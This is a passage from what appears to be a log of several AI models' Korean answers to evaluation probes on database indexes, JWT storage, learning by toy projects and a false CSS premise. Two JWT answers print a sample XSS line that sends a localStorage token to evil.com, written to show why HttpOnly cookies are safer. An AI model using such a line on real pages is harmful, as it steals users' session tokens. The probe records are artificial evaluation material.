점프합니다.\n\n대부분의 DB는 인덱스를 **B-Tree(균형 트리)** 구조로 만들어서, 정렬된 상태로 데이터의 위치(포인터)를 저장합니다. 그래서 검색이 `O(전체 행 수)`에서 `O(log n)`으로 빨라져요.\n\n```sql\nCREATE INDEX idx_users_email ON users(email);\n```\n\n---\n\n## 인덱스가 도움이 될 때\n\n- **`WHERE` 조건으로 자주 검색하는 컬럼** — `WHERE email = '...'`\n- **`JOIN`에 쓰이는 컬럼** — 외래 키(FK)는 거의 항상 인덱스 대상\n- **`ORDER BY` / `GROUP BY`에 쓰이는 컬럼** — 정렬 작업을 건너뛸 수 있음\n- **카디널리티(고유값)가 높은 컬럼** — 이메일, 주문번호처럼 값이 다양할수록 효과적\n- **읽기(SELECT)가 많은 테이블** — 조회 위주 워크로드에서 이득이 큼\n\n---\n\n## 인덱스가 오히려 안 좋을 때\n\n- **쓰기(INSERT/UPDATE/DELETE)가 많은 테이블** — 데이터가 바뀔 때마다 인덱스도 같이 갱신해야 해서 **쓰기 성능이 떨어짐**\n- **카디널리티가 낮은 컬럼** — 예: `성별`, `is_active`(true/false)처럼 값 종류가 적으면, 인덱스를 타도 결국 많은 행을 읽게 되어 별 효과 없음\n- **테이블이 작을 때** — 행이 몇백 개면 그냥 전체 스캔(full scan)이 더 빠를 수 있음\n- **저장 공간 / 메모리 추가 소모** — 인덱스도 디스크와 메모리를 차지함\n- **사용하지 않는 인덱스** — 쿼리에서 안 쓰는데 만들어만 두면 **비용(쓰기 부담·공간)만 발생하고 이득은 0**\n\n---\n\n## 핵심 트레이드오프\n\n> **인덱스 = 읽기 속도를 위해 쓰기 속도와 저장 공간을 희생하는 것**\n\n그래서 실무에서는:\n1. 실제 느린 쿼리를 `EXPLAIN`(실행 계획)으로 확인하고\n2. 정말 필요한 컬럼에만 인덱스를 추가하고\n3. 안 쓰는 인덱스는 제거하는\n\n식으로 **측정 후 추가**하는 게 정석입니다. \"일단 많이 걸어두자\"는 보통 역효과가 나요.\n\n복합 인덱스(여러 컬럼)나 커버링 인덱스 같은 더 깊은 주제도 있는데, 필요하면 이어서 설명해 드릴게요.", "ok": true}, {"model": "claude-opus-4-6", "probe": "challenge", "kind": "dialogue", "a": "# JWT를 localStorage에 보관하는 것은 안전하지 않다\n\n## 핵심 위험: XSS (Cross-Site Scripting)\n\nlocalStorage는 **JavaScript로 자유롭게 접근**할 수 있다.\n\n```js\n// 공격자가 XSS 취약점 하나만 찾으면 끝\nconst token = localStorage.getItem('token');\nfetch('https://evil.com/steal?token=' + token);\n```\n\nXSS가 단 한 곳이라도 존재하면 토큰이 탈취되고, 공격자는 사용자인 척 API를 호출할 수 있다.\n\n---\n\n## localStorage의 문제점 정리\n\n| 문제 | 설명 |\n|---|---|\n| **XSS에 노출** | 모든 JS 코드가 읽기/쓰기 가능 |\n| **자동 만료 없음** | 브라우저가 알아서 지워주지 않음 |\n| **요청에 자동 첨부 안 됨** | 매번 JS로 헤더에 넣어야 함 → JS 접근 필수 → XSS 공격 표면 확대 |\n| **탭/창 간 공유** | 같은 origin이면 모든 탭에서 접근 가능 |\n\n---\n\n## 더 나은 대안: HttpOnly 쿠키\n\n```\nSet-Cookie: token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/\n```\n\n| 속성 | 효과 |\n|---|---|\n| `HttpOnly` | **JavaScript에서 접근 불가** → XSS로 탈취 불가 |\n| `Secure` | HTTPS에서만 전송 |\n| `SameSite=Strict` | 다른 사이트에서 온 요청에 쿠키 미첨부 → CSRF 방어 |\n\n### 쿠키 방식의 주의점\n- **CSRF 방어**를 별도로 해야 한다 (SameSite + CSRF 토큰)\n- 쿠키 크기 제한이 있다 (~4KB)\n\n---\n\n## 실무 권장 패턴\n\n```\n[브라우저] ←→ [BFF / API Gateway] ←→ [백엔드 API]\n             HttpOnly 쿠키              서버 간 JWT\n```\n\n1. **로그인 시** 서버가 JWT를 `HttpOnly` 쿠키로 설정\n2. **브라우저**는 토큰 값을 전혀 모름 (JS 접근 불가)\n3. **API 호출 시** 쿠키가 자동 첨부됨\n4. **Access Token**은 짧게 (15분), **Refresh Token**은 서버 세션 또는 별도 HttpOnly 쿠키\n\n---\n\n## 결론\n\n| 방식 | XSS 안전 | CSRF 안전 | 권장 |\n|---|---|---|---|\n| localStorage | ❌ | ✅ | ❌ |\n| 일반 쿠키 | ❌ | ❌ | ❌ |\n| HttpOnly + Secure + SameSite 쿠키 | ✅ | ✅ | ✅ |\n| 메모리(변수) | ✅ | ✅ | △ (새로고침 시 유실) |\n\n**localStorage에 JWT를 넣지 마라.** `HttpOnly; Secure; SameSite=Strict` 쿠키를 써라.", "text": "# 옛날 얘기가 아니다. 지금도 정확히 같은 이야기다.\n\n\"다들 쓰니까 괜찮다\"는 보안에서 가장 위험한 논리다. 하나씩 짚어보자.\n\n---\n\n## \"요즘 앱들 다 localStorage 쓰던데?\"\n\n맞다, 많이 쓴다. 그런데 그건 **안전해서가 아니라 쉬우니까** 그런 거다.\n\n```js\n// 이 코드가 5초면 짜지니까 쓰는 거지, 안전해서가 아니다\nlocalStorage.setItem('token', jwt)\naxios.defaults.headers.common['Authorization'] = `Bearer ${jwt}`\n```\n\nHttpOnly 쿠키 방식은 백엔드 세팅이 더 필요하고 CORS/CSRF 설정이 복잡하다. 스타트업이나 사이드 프로젝트에서 \"귀찮아서\" 안 하는 것이지 \"안전해서\" localStorage를 선택한 게 아니다.\n\n---\n\n## 가장 흔한 반론: \"XSS 뚫리면 어차피 끝 아니야?\"\n\n이게 가장 널리 퍼진 오해다. 차이가 **확실히** 있다.\n\n### localStorage에 토큰이 있을 때 (XSS 발생 시)\n```\n1. 공격자가 토큰을 탈취 → 자기 서버로 전송\n2. XSS 취약점이 패치된 후에도 토큰은 공격자 수중\n3. 토큰 만료 전까지 어디서든, 언제든 사용 가능\n4. 여러 사람에게 공유 가능\n5. 자동화된 대규모 공격에 활용 가능\n```\n\n### HttpOnly 쿠키일 때 (XSS 발생 시)\n```\n1. 공격자가 토큰 자체를 꺼낼 수 없음\n2. 피해자 브라우저를 통해서만 요청 가능 (세션 라이딩)\n3. 사용자가 탭을 닫거나, XSS가 패치되면 끝\n4. 토큰을 빼돌려 오프라인에서 쓸 수 없음\n5. 공격 범위가 해당 세션, 해당 순간으로 한정됨\n```\n\n| | localStorage | HttpOnly 쿠키 |\n|---|---|---|\n| 토큰 탈취 | ✅ 가능 | ❌ 불가 |\n| 오프라인 악용 | ✅ 가능 | ❌ 불가 |\n| XSS 패치 후 지속 피해 | ✅ 토큰 만료까지 | ❌ 즉시 종료 |\n| 피해 범위 | 광범위 | 제한적 |\n\n**\"어차피 XSS면 끝\"이 아니라, 폭발 반경(blast radius)이 완전히 다르다.**\n\n---\n\n## \"React/Vue 같은 프레임워크가 XSS 막아주잖아\"\n\n기본 보호는 해준다. 하지만:\n\n- `dangerouslySetInnerHTML` / `v-html` 하나만 실수하면 뚫린다\n- 서드파티 npm 패키지 하나가 오염되면 뚫린다 (supply chain attack)\n- 마크다운 렌더러, 리치 텍스트 에디터 등 예외 케이스가 많다\n- CSP를 완벽하게 설정한 서비스가 현실적으로 얼마나 되는가?\n\n프레임워크를 쓴다고 XSS가 **불가능해지는 것이 아니라 어려워지는 것**일 뿐이다. 보안은 \"어려우니까 괜찮겠지\"로 판단하는 게 아니다.\n\n---\n\n## 실제 보안 권고는 어떨까\n\n이건 내 개인 의견이 아니다:\n\n- **OWASP**: *\"Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the httpOnly flag.\"* — [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)\n- **Auth0**: 자사 SDK에서 기본값을 in-memory + rotating refresh token 방식으로 바꿨다\n- **Microsoft MSAL**: 기본 저장소가 `sessionStorage`이고, `HttpOnly` 쿠키 방식 권장\n\n2026년인 지금도 OWASP 가이드라인은 바뀌지 않았다.\n\n---\n\n## 정리\n\n| 주장 | 현실 |\n|---|---|\n| \"다들 쓴다\" | 쉬워서 쓰는 거지, 안전해서가 아니다 |\n| \"XSS면 어차피 끝\" | 끝이 아니라, 피해 규모가 완전히 다르다 |\n| \"프레임워크가 막아줌\" | 줄여줄 뿐 없애주지 않는다 |\n| \"옛날 얘기\" | 2026년 현재 OWASP 권고 동일 |\n\n---\n\n**편의성과 보안성을 헷갈리면 안 된다.** localStorage가 편한 건 맞지만, 안전하다는 근거는 지금도 없다. 깊게 생각하는 게 아니라, 이 정도는 생각해야 하는 거다.", "ok": true}, {"model": "claude-opus-4-8", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "시간 낭비 아니다. 오히려 많은 경우에 더 빠르고 더 오래 남는다. 정리하자면:\n\n**토이 프로젝트가 강한 이유**\n- **기억에 남는다.** 강의 영상은 보는 순간 이해한 것 같지만 손으로 쳐보지 않으면 휘발된다. 직접 막히고 해결한 건 안 잊는다.\n- **진짜 어려움을 만난다.** 강의는 깔끔하게 정리된 길만 보여준다. 실제 언어 학습의 핵심은 \"에러 메시지 읽고 검색해서 고치는 능력\"인데, 이건 프로젝트에서만 길러진다.\n- **그 언어의 생태계를 배운다.** 패키지 매니저, 빌드 도구, 표준 라이브러리, 디버거 — 문법보다 이게 실무 진입장벽인데 프로젝트 없이는 안 만진다.\n- **동기가 유지된다.** \"내가 만들고 싶은 것\"이 있으면 끝까지 간다.\n\n**단, 토이 프로젝트만 하면 빠지는 함정**\n- 기본 문법/관용구(idiom)를 건너뛰고 \"다른 언어를 이 언어 문법으로 쓰기\"만 하게 됨 → 그 언어다운 코드를 못 배움.\n- 매번 똑같은 수준(CRUD, 기본 API 호출)만 반복하면 성장이 멈춤.\n\n**현실적인 추천: 섞어라**\n1. 처음 1~2주만 빠르게 — 공식 튜토리얼이나 짧은 강의로 **문법/타입 시스템/도구 체인 한 바퀴**. (전체를 다 볼 필요 없음, 30~40%만)\n2. 그다음 바로 **토이 프로젝트**로 넘어가서 직접 만든다.\n3. 막히는 부분만 그때그때 강의/문서로 **핀포인트 학습**. (전체 강의를 순서대로 끝낼 필요 없음)\n4. 어느 정도 만들면 그 언어 잘 쓰는 사람의 코드/오픈소스를 읽고 내 코드와 비교 → \"이 언어다운 방식\" 흡수.\n\n요약하면, 강의는 **지도**고 프로젝트는 **여행**이다. 지도만 봐서는 그 도시를 안다고 할 수 없다. 토이 프로젝트로 배우는 건 시간 낭비가 아니라 오히려 가장 효율적인 학습 경로에 가깝다 — 다만 출발할 때 최소한의 기본기를 빠르게 챙기는 게 좋다.\n\n혹시 어떤 언어를 배우려는지 알려주면, 그 언어에 맞는 좋은 첫 토이 프로젝트랑 학습 자료를 구체적으로 추천해줄게.", "ok": true}, {"model": "claude-opus-4-8", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "짧게 답하면: **그 전제가 틀렸어. CSS에는 \"재귀 함수\"라는 개념 자체가 없어서, 가장 깔끔한 방법 같은 건 존재하지 않아.**\n\n오해를 하나씩 풀어볼게.\n\n## CSS는 \"함수가 있는 프로그래밍 언어\"가 아니야\n\nCSS는 **선언형(declarative) 스타일 언어**야. \"이 요소는 이렇게 보여라\"라고 상태를 기술할 뿐, 호출하고 반환하는 함수도, 변수에 값을 누적하는 흐름 제어도 없어.\n\n- **반복문 없음**: `@keyframes`나 셀렉터 패턴(`li:nth-child(...)`)이 반복처럼 보이지만, 이건 \"이미 존재하는 요소들에 규칙을 매칭\"하는 거지 루프를 도는 게 아니야. 새 요소를 만들어내지도 못해.\n- **조건문 없음(거의)**: `@media`, `@supports`, `:has()`, `@container` 같은 조건부 매칭은 있지만, 임의의 분기 로직을 표현하는 if/else가 아니야.\n- **재귀 없음**: 자기 자신을 호출할 함수가 없으니 재귀도 정의 불가능.\n\n## \"CSS가 튜링 완전하다\"는 주장의 진실\n\n가끔 \"CSS는 튜링 완전하다\"는 말을 듣는데, 정확히는:\n\n- 그건 **순수 CSS만**으로 성립하는 게 아니라, **HTML 마크업 + CSS + 사용자의 반복 입력(클릭/탭)** 같은 외부 \"클럭(clock)\"이 결합됐을 때의 이야기야. 유명한 Rule 110 구현이 그 예인데, 사람이 계속 키를 눌러줘야 상태가 진행돼.\n- 즉 계산을 진행시키는 동력이 CSS 바깥에 있어. CSS 혼자서는 한 발짝도 스스로 못 나가.\n\n## 그래서 \"재귀처럼 보이는 것\"을 정말 원한다면\n\n진짜 의도가 뭐냐에 따라 방향이 달라:\n\n1. **반복적인 스타일 생성** → **Sass/Less** 같은 전처리기. 여기엔 진짜 `@function`, `@for`, `@while`, 재귀 호출이 있어. 단, 이건 빌드 시점에 평범한 CSS로 펼쳐지는 거라 결과물은 그냥 정적 CSS야.\n\n   ```scss\n   @function fib($n) {\n     @if $n < 2 { @return $n; }\n     @return fib($n - 1) + fib($n - 2);\n   }\n   ```\n\n2. **런타임 계산** → CSS Custom Properties + `calc()`, 혹은 새로 나온 `if()` / 삼항 같은 기능들이 조건 표현을 늘려주고 있지만, 여전히 재귀나 임의 반복은 안 돼. 진짜 로직이 필요하면 **JS**.\n\n원하는 게 \"Sass에서 재귀 함수 깔끔하게 짜기\"인지, 아니면 \"순수 CSS의 한계 안에서 반복 패턴 처리\"인지 말해주면 거기에 맞춰서 구체적으로 도와줄게.", "ok": true}, {"model": "claude-opus-4-7", "probe": "challenge", "kind": "dialogue", "a": "결론부터: **권장되지 않습니다.** localStorage에 JWT를 넣는 건 XSS에 그대로 노출됩니다.\n\n## 왜 위험한가\n\n- **XSS = 토큰 탈취 확정**: localStorage는 같은 출처의 어떤 JS 코드든 `localStorage.getItem()`으로 읽을 수 있습니다. 광고 스크립트, 서드파티 라이브러리, npm 의존성 하나가 오염되면 그 즉시 토큰이 외부로 빠져나갑니다.\n- **HttpOnly 보호 불가**: 쿠키와 달리 localStorage는 JS에서 격리할 방법이 없습니다.\n- **자동 만료/스코핑 없음**: 명시적으로 지우지 않는 한 영구 저장됩니다. 공용 PC에서 특히 위험.\n- **장수명 토큰일수록 피해 큼**: JWT는 stateless라 서버에서 즉시 무효화하기 어렵습니다(블랙리스트 안 쓰면).\n\n## 더 나은 대안\n\n1. **HttpOnly + Secure + SameSite=Lax/Strict 쿠키** (가장 일반적 권장)\n   - JS에서 못 읽음 → XSS로 토큰 직접 탈취 불가\n   - 단점: CSRF 대비 필요 (SameSite로 대부분 막히지만, 민감 작업엔 CSRF 토큰 병행)\n\n2. **짧은 수명 access token (메모리) + HttpOnly refresh token (쿠키)**\n   - access token은 JS 변수(메모리)에만 보관 → 새로고침 시 refresh 엔드포인트로 재발급\n   - 탭 닫으면 사라짐, XSS 영향 최소화\n   - SPA에서 가장 견고한 패턴\n\n3. **BFF(Backend-for-Frontend) 패턴**\n   - 브라우저는 세션 쿠키만 들고, 실제 JWT는 백엔드가 보관/프록시\n   - 토큰을 클라이언트가 아예 안 봄\n\n## 그래도 localStorage를 쓰겠다면 최소 조건\n\n- 강력한 **CSP**(`script-src` 화이트리스트, `unsafe-inline` 금지)\n- 모든 사용자 입력에 대한 출력 이스케이프 (React/Vue 기본값 신뢰하되 `dangerouslySetInnerHTML` 류 금지)\n- 서드파티 스크립트 최소화 + **SRI**\n- 짧은 만료(예: 15분) + 서버측 토큰 무효화 메커니즘\n- 의존성 감사 (`npm audit`, Snyk 등)\n\n요약하면 **메모리 + HttpOnly 쿠키 조합**이 SPA의 현실적인 베스트입니다. localStorage는 편하지만, 한 번의 XSS가 전체 계정 탈취로 직결됩니다.", "text": "아니요, **옛날 얘기 아닙니다.** 오히려 최근 공급망 공격(supply chain attack) 사례들 때문에 더 중요해진 주제입니다.\n\n## \"요즘 다 그렇게 한다\"는 오해\n\n많이 보이는 건 맞습니다. 튜토리얼이 쉬워서 따라 만든 결과지, **보안 모범 사례라서가 아닙니다.** 보안 권고는 일관됩니다:\n\n- **OWASP**: JWT in localStorage는 XSS에 취약하다고 명시. HttpOnly 쿠키 권장.\n- **Auth0 공식 문서**: \"Don't store tokens in local storage\" — 자기네 SDK도 기본은 메모리 저장.\n- **Okta, Auth0, Clerk, Supabase** 등 주요 인증 벤더가 access token은 메모리, refresh token은 HttpOnly 쿠키 패턴으로 수렴 중.\n\n## \"요즘\"이라 더 위험해진 이유\n\n- **npm 공급망 공격 급증**: `event-stream`(2018), `ua-parser-js`(2021), 최근 `lottie-player`, `polyfill.io` 사건(2024) 등 — 정상 패키지가 어느 날 토큰 탈취 코드로 바뀝니다. localStorage면 그 즉시 끝.\n- **브라우저 확장/번역 도구/A11y 도구**가 페이지 DOM과 스크립트 컨텍스트에 접근. 쿠키 HttpOnly는 막아주지만 localStorage는 못 막음.\n- **React/Vue 써도 XSS는 사라지지 않음**: `dangerouslySetInnerHTML`, `v-html`, 서버 렌더링 미이스케이프, 마크다운 렌더러, SVG 업로드 등 경로가 여전히 많습니다.\n\n## 위험 비교 (실제 사고 시나리오)\n\n| 저장 위치 | XSS 발생 시 | 의존성 오염 시 |\n|---|---|---|\n| localStorage | 토큰 즉시 유출 | 즉시 유출 |\n| HttpOnly 쿠키 | 토큰 자체는 못 읽음 (요청 위조는 가능하지만 세션 한정) | 토큰 자체는 못 읽음 |\n| 메모리 + HttpOnly refresh | 현재 탭 한정 + 짧은 수명 | 동일 |\n\n차이는 **\"전체 계정이 통째로 외부 서버로 빠져나가느냐\"** vs **\"공격자가 그 탭에 있는 동안만 요청을 흉내내느냐\"** 입니다. 사고 규모가 다릅니다.\n\n## 정리\n\n깊게 생각하는 게 아니라 **사고가 났을 때의 폭발 반경** 차이입니다. 토이 프로젝트면 localStorage도 괜찮습니다. 하지만 사용자 계정·결제·개인정보가 걸린 프로덕션이라면 HttpOnly 쿠키(또는 메모리 + refresh) 패턴이 여전히 정답입니다. 원래 답변 유지합니다.", "ok": true}, {"model": "codex-5.5", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "시간 낭비는 아닙니다. 오히려 **언어를 실제로 쓰는 감각**을 얻는 데는 토이 프로젝트가 강의보다 더 효과적일 때가 많습니다.\n\n다만 조건이 있습니다.\n\n토이 프로젝트가 좋은 경우:\n- 이미 프로그래밍 기본기는 어느 정도 있다\n- “이 언어로 뭔가 만들어보고 싶다”는 동기가 있다\n- 문법을 전부 외우기보다 필요할 때 찾아보는 방식이 괜찮다\n- 작은 완성물을 목표로 한다\n\n시간 낭비가 되기 쉬운 경우:\n- 프로젝트 범위가 너무 크다\n- 언어보다 프레임워크, 배포, 인증, DB 같은 부가 요소에 압도된다\n- 막힐 때마다 “기초가 없어서 그런가?” 하고 방향을 계속 바꾼다\n- 완성보다 공부 계획 자체를 계속 재설계한다\n\n제일 좋은 방식은 둘을 섞는 겁니다.\n\n1. 2~3시간짜리 초단기 입문 자료로 문법 감 잡기  \n2. 바로 작은 토이 프로젝트 시작하기  \n3. 막힌 개념만 공식 문서나 강의에서 골라 보기  \n4. 끝나고 “이 언어다운 방식”으로 리팩터링하기\n\n예를 들어 새 언어를 배울 때 좋은 토이 프로젝트는:\n- CLI 할 일 관리 앱\n- JSON/CSV 파서 또는 변환기\n- 간단한 웹 API\n- 파일 정리 스크립트\n- 미니 블로그/메모 앱\n- 기존에 Python/JS로 만들었던 걸 새 언어로 다시 구현\n\n핵심은 **“언어를 배우는 프로젝트”로 시작해야지 “프로덕트 만드는 프로젝트”로 시작하면 안 된다**는 점입니다. 범위를 작게 잡으면 토이 프로젝트는 시간 낭비가 아니라 꽤 좋은 학습법입니다.", "ok": true}, {"model": "codex-5.5", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "데이터베이스 인덱스는 **테이블의 특정 컬럼 값을 빨리 찾기 위한 별도 자료구조**입니다. 책 뒤의 색인과 비슷합니다. 책 전체를 처음부터 끝까지 훑지 않고, 색인에서 단어 위치를 찾은 뒤 해당 페이지로 바로 가는 방식입니다.\n\n예를 들어:\n\n```sql\nSELECT * FROM users WHERE email = 'a@example.com';\n```\n\n`email` 컬럼에 인덱스가 없으면 DB는 `users` 테이블을 많이 훑어야 할 수 있습니다.  \n`email` 인덱스가 있으면 DB는 인덱스에서 해당 값을 빠르게 찾고 필요한 행으로 이동할 수 있습니다.\n\n## 인덱스가 도움이 되는 경우\n\n인덱스는 보통 이런 경우에 좋습니다.\n\n1. **WHERE 조건에 자주 쓰이는 컬럼**\n\n```sql\nSELECT * FROM orders WHERE user_id = 123;\n```\n\n`user_id`로 주문을 자주 찾는다면 `user_id` 인덱스가 도움이 됩니다.\n\n2. **JOIN 조건에 쓰이는 컬럼**\n\n```sql\nSELECT *\nFROM orders o\nJOIN users u ON o.user_id = u.id;\n```\n\n`orders.user_id`, `users.id` 같은 컬럼은 인덱스가 있으면 조인이 빨라질 수 있습니다.\n\n3. **정렬이나 범위 검색에 쓰이는 컬럼**\n\n```sql\nSELECT * FROM posts\nWHERE created_at >= '2026-01-01'\nORDER BY created_at DESC;\n```\n\n`created_at` 인덱스가 있으면 범위 검색과 정렬에 도움이 될 수 있습니다.\n\n4. **값의 종류가 많은 컬럼**\n\n예를 들어 `email`, `user_id`, `order_id`, `created_at`처럼 값이 다양하면 인덱스 효과가 큽니다.\n\n## 인덱스가 오히려 안 좋은 경우\n\n인덱스는 공짜가 아닙니다. 추가하면 읽기는 빨라질 수 있지만 비용도 생깁니다.\n\n1. **INSERT, UPDATE, DELETE가 느려질 수 있음**\n\n테이블 데이터만 바꾸는 게 아니라 인덱스도 같이 갱신해야 합니다.\n\n```sql\nINSERT INTO users (...) VALUES (...);\nUPDATE users SET email = ... WHERE id = ...;\nDELETE FROM users WHERE id = ...;\n```\n\n인덱스가 많을수록 쓰기 작업 비용이 증가합니다.\n\n2. **디스크 공간을 더 씀**\n\n인덱스는 별도의 자료구조이므로 저장 공간을 차지합니다. 큰 테이블에 여러 인덱스를 만들면 공간 사용량이 꽤 커질 수 있습니다.\n\n3. **값의 종류가 적은 컬럼에는 효과가 작을 수 있음**\n\n예를 들어 `gender`, `is_active`, `status`처럼 값이 몇 개 안 되는 컬럼은 단독 인덱스 효과가 낮을 수 있습니다.\n\n```sql\nSELECT * FROM users WHERE is_active = true;\n```\n\n대부분의 사용자가 `true`라면 인덱스를 타도 결국 많은 행을 읽어야 하므로 큰 이득이 없습니다.\n\n4. **잘 안 쓰는 인덱스는 유지 비용만 생김**\n\n쿼리에서 거의 사용되지 않는 컬럼에 인덱스를 만들면 읽기 성능 개선은 없고 쓰기 비용과 저장 공간만 늘어납니다.\n\n## 핵심 기준\n\n인덱스를 추가할지 판단할 때는 보통 이렇게 봅니다.\n\n- 자주 실행되는 쿼리인가?\n- `WHERE`, `JOIN`, `ORDER BY`, `GROUP BY`에 쓰이는 컬럼인가?\n- 해당 조건으로 결과가 많이 줄어드는가?\n- 테이블이 충분히 큰가?\n- 쓰기보다 읽기가 더 중요한 테이블인가?\n\n작은 테이블은 인덱스가 없어도 전체 스캔이 충분히 빠를 수 있습니다. 반대로 큰 테이블에서 자주 쓰이는 검색 조건에는 인덱스가 큰 차이를 만듭니다.\n\n한 줄로 말하면: **인덱스는 읽기 성능을 위해 쓰기 비용과 저장 공간을 지불하는 최적화 장치**입니다.", "ok": true}, {"model": "claude-opus-4-8", "probe": "challenge", "kind": "dialogue", "a": "짧게 답하면: **별로 안전하지 않습니다.** localStorage에 JWT를 보관하는 건 가장 흔한 방식이지만 보안상 권장되지 않는 패턴입니다.\n\n## 핵심 위험: XSS\n\nlocalStorage는 같은 출처(origin)의 **모든 JavaScript에서 읽을 수 있습니다.** 따라서 페이지에 XSS 취약점이 하나라도 있으면(직접 작성한 코드든, 서드파티 npm 패키지든, 광고 스크립트든) 공격자가 이렇게 토큰을 통째로 빼갈 수 있습니다:\n\n```js\nfetch('https://evil.com/steal?t=' + localStorage.getItem('token'))\n```\n\n토큰이 유출되면 만료될 때까지 공격자가 사용자를 완전히 사칭할 수 있습니다.\n\n## 권장 방식: httpOnly 쿠키\n\n```\nSet-Cookie: token=...; HttpOnly; Secure; SameSite=Strict; Path=/\n```\n\n| 속성 | 효과 |\n|------|------|\n| `HttpOnly` | JavaScript에서 접근 불가 → XSS로 토큰 탈취 차단 |\n| `Secure` | HTTPS에서만 전송 |\n| `SameSite=Strict/Lax` | CSRF 공격 완화 |\n\n이러면 XSS가 있어도 토큰 자체는 못 훔칩니다. 다만 쿠키는 자동 전송되므로 **CSRF 방어**(SameSite + CSRF 토큰)를 추가로 해야 합니다.\n\n## 실무에서 흔한 패턴\n\n가장 견고한 구성:\n\n1. **액세스 토큰**: 짧은 수명(예: 15분), 메모리(변수)에만 보관 — 새로고침하면 사라지는 게 정상\n2. **리프레시 토큰**: `HttpOnly` + `Secure` + `SameSite` 쿠키에 보관, 액세스 토큰 갱신 전용\n3. 갱신은 `/refresh` 엔드포인트로\n\n## 정리\n\n- **localStorage / sessionStorage**: XSS에 취약 → 지양\n- **httpOnly 쿠키**: XSS에 안전, 단 CSRF 대책 필요 → 권장\n- 무엇을 쓰든 **HTTPS 필수, 토큰 수명은 짧게**\n\n근본적으로는 어떤 저장소를 쓰든 XSS 자체를 막는 것(입력 검증, 출력 이스케이프, CSP 헤더, 의존성 관리)이 가장 중요합니다. 저장 위치는 \"XSS가 뚫렸을 때 피해를 얼마나 줄이느냐\"의 문제입니다.\n\n원하시면 사용 중인 스택(예: React + Express, Next.js 등)에 맞춰 구체적인 구현 예시를 드릴게요.", "text": "결론부터: **옛날 얘기 아닙니다.** 오히려 이건 지금도 OWASP가 유지하는 입장이고, 최근까지도 보안 쪽에서 반복해서 강조되는 내용이에요. \"요즘 앱들 다 그렇게 한다\"는 건 *흔하다*는 거지 *안전하다*는 뜻은 아닙니다. 흔한 거랑 권장되는 건 다른 문제예요.\n\n다만, 왜 그런 인상을 받았는지는 짚어볼 만합니다.\n\n## \"다들 localStorage 쓴다\"가 생기는 이유\n\n- **튜토리얼/부트스트랩 코드가 그렇게 돼 있어서.** `localStorage.setItem('token', ...)`가 제일 가르치기 쉬우니까요. 프로덕션 권장이라서가 아니라 데모라서 그런 겁니다.\n- **SPA에서 httpOnly 쿠키 + CSRF 세팅이 귀찮아서** 그냥 localStorage로 가는 경우가 많습니다. \"편해서 선택\"이지 \"안전해서 선택\"이 아니에요.\n- 실제로 많은 대형 서비스는 **액세스 토큰은 메모리, 리프레시는 httpOnly 쿠키** 조합을 씁니다. 겉보기엔 JS로 토큰을 다루는 것처럼 보여도 영구 저장은 localStorage에 안 합니다.\n\n## 바뀐 게 있긴 합니다 (그런데 방향은 반대)\n\n최근 몇 년 사이 바뀐 건 \"localStorage가 안전해졌다\"가 아니라:\n\n- **공급망 공격(supply-chain)이 훨씬 심해졌습니다.** npm 의존성 하나가 털리면 그 스크립트가 곧장 `localStorage`를 읽어갑니다. 의존성 수백 개 쓰는 요즘 프론트엔드에서 이건 오히려 더 큰 위협이 됐어요.\n- 그래서 OAuth 진영에서도 브라우저 앱은 **BFF(Backend-for-Frontend) 패턴 + httpOnly 쿠키**를 권장하는 쪽으로 가이드가 정리됐습니다. localStorage 쪽으로 완화된 게 아니라 더 보수적으로 갔습니다.\n\n## 그래서 핵심은 그대로\n\nXSS나 악성 의존성이 한 번 뚫렸을 때:\n\n- **localStorage**: 토큰 통째로 유출 → 만료까지 완전 사칭\n- **httpOnly 쿠키**: JS가 못 읽음 → 토큰 자체는 못 빼감 (피해 범위가 줄어듦)\n\n이 차이는 브라우저 보안 모델이 바뀌지 않는 한 사라지지 않습니다. 제가 과하게 파고든 게 아니라, 토큰 저장 위치는 원래 이 한 가지(피해 최소화)로 판단하는 거예요.\n\n## 솔직한 균형\n\n- 취미 프로젝트나 내부 도구면 localStorage 써도 현실적으로 큰일 안 납니다. \"절대 쓰지 마라\"까진 아니에요.\n- 하지만 **남의 로그인/결제/개인정보를 다루는 서비스**라면, 흔하다는 이유로 localStorage를 고르는 건 권하지 않습니다. 추가 비용이 httpOnly 쿠키 세팅 정도인데 막아주는 위험이 큽니다.\n\n쓰시는 게 어떤 종류의 앱인지 알려주시면, \"이 경우엔 localStorage로 충분\"인지 \"쿠키로 가는 게 맞다\"인지 딱 잘라 말씀드릴게요.", "ok": true}, {"model": "codex-5.4", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "데이터베이스 인덱스는 책의 `찾아보기`와 비슷합니다.  \n테이블 전체를 처음부터 끝까지 읽지 않고, 특정 값이 어디 있는지 빨리 찾도록 도와주는 별도 구조입니다.\n\n예를 들어 `users(email)`에 인덱스가 있으면:\n\n```sql\nSELECT * FROM users WHERE email = 'a@example.com';\n```\n\n이런 조회를 훨씬 빨리 처리할 수 있습니다.\n\n언제 도움이 되나\n\n- `WHERE`로 자주 찾는 컬럼이 있을 때\n- `JOIN`에 자주 쓰는 컬럼이 있을 때\n- `ORDER BY`, `GROUP BY`가 자주 발생할 때\n- 데이터가 많고, 조회 대상이 전체 중 일부일 때\n- `UNIQUE` 제약과 함께 중복 방지도 필요할 때\n\n예시:\n\n- `user_id`로 주문 조회\n- `email`로 회원 조회\n- `created_at` 기준 최근 데이터 정렬\n- `status + created_at` 조합으로 특정 상태의 최신 글 조회\n\n언제 오히려 안 좋나\n\n- `INSERT`, `UPDATE`, `DELETE`가 많을 때  \n  인덱스도 같이 